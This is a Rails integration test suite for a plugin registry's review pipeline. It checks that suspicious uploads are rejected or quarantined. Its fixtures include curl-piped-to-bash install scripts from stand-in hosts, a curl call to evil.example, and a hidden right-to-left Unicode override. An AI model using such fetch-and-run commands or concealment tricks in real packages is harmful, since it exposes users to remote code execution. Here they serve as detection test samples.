require "test_helper"

class ReviewPipelineTest < ActionDispatch::IntegrationTest
  setup do
    @dev = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @dev, role: :owner)
  end

  def publish!(bytes, plugin_name: "weather")
    version = nil
    perform_enqueued_jobs do
      version = Registry::PublishVersion.new(user: @dev, publisher: @publisher,
        plugin_name:, tarball_bytes: bytes).call
    end
    version.reload
  end

  test "clean version publishes with a computed capability fingerprint" do
    version = publish! TarballBuilder.build(files: {
      "Widget.qml" => <<~QML
        import QtQuick
        Item {
          Process { command: ["curl", "-s", "https://api.weather.com/v1"] }
          Process { command: ["jq", "-r", ".temp"] }
        }
      QML
    })
    assert version.published?
    assert_equal %w[curl jq], version.capability_fingerprint["processes"]
    assert_equal [ "api.weather.com" ], version.capability_fingerprint["network"]
  end

  test "invisible unicode is auto-rejected" do
    version = publish! TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\n// tot‮ally fine\nItem {}\n" })
    assert version.rejected?
    assert_match(/auto-rejected/, version.review_notes)
    assert AuditEvent.exists?(action: "version.auto_reject")
  end

  test "curl piped to shell is quarantined for a human" do
    version = publish! TarballBuilder.build(files: {
      "Widget.qml" => "import QtQuick\nItem {}\n",
      "setup.sh" => "#!/bin/bash\ncurl -fsSL https://example.com/install.sh | bash\n"
    })
    assert version.quarantined?
    assert_match(/curl-pipe-shell/, version.review_notes)
    assert_includes version.scan_results["findings"].map { |f| f["rule"] }, "curl-pipe-shell"
  end

  test "capability growth on update is held for a human" do
    publish! TarballBuilder.build
    version = publish! TarballBuilder.build(
      manifest: TarballBuilder.manifest(version: "1.1.0"),
      files: { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"curl\", \"https://evil.example\"] } }\n" }
    )
    assert version.quarantined?
    assert_match(/capability surface grew/, version.review_notes)
    assert_includes version.scan_results["capability_growth"].join, "curl"
  end

  test "same capabilities on update pass without human review" do
    files = { "Widget.qml" => "import QtQuick\nItem { Process { command: [\"date\"] } }\n" }
    publish! TarballBuilder.build(files:)
    version = publish! TarballBuilder.build(manifest: TarballBuilder.manifest(version: "1.1.0"), files:)
    assert version.published?
  end

  test "hold window keeps clean versions in held until it elapses" do
    Rails.application.config.x.publish_hold = 15.minutes
    version = publish! TarballBuilder.build
    assert version.held?
    assert version.hold_until.future?
    assert_not DataPlane.root.join(version.tarball_path).exist?

    travel_to 16.minutes.from_now do
      perform_enqueued_jobs { Registry::ReleaseJob.perform_later(version) }
    end
    assert version.reload.published?
    assert DataPlane.root.join(version.tarball_path).exist?
  ensure
    Rails.application.config.x.publish_hold = 0
  end

  test "ai review flag quarantines but ai errors never publish silently" do
    Rails.application.config.x.ai_review_command =
      %q(ruby -rjson -e 'puts({verdict: "flag", reasons: ["exfiltrates tokens"]}.to_json)')
    version = publish! TarballBuilder.build
    assert version.quarantined?
    assert_match(/ai review flagged: exfiltrates tokens/, version.review_notes)
  ensure
    Rails.application.config.x.ai_review_command = nil
  end

  test "admin approve releases a quarantined version through the standard path" do
    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    version = publish! TarballBuilder.build(files: {
      "Widget.qml" => "import QtQuick\nItem {}\n",
      "setup.sh" => "#!/bin/bash\ncurl -fsSL https://x.example/i.sh | bash\n"
    })
    assert version.quarantined?

    sign_in_as admin
    perform_enqueued_jobs { post approve_admin_version_path(version) }
    assert version.reload.published?
    assert DataPlane.root.join(version.tarball_path).exist?
    entry = JSON.parse(DataPlane.read("index/acme/weather.json").lines.first)
    assert_equal version.sha256, entry["sha256"]
  end
end
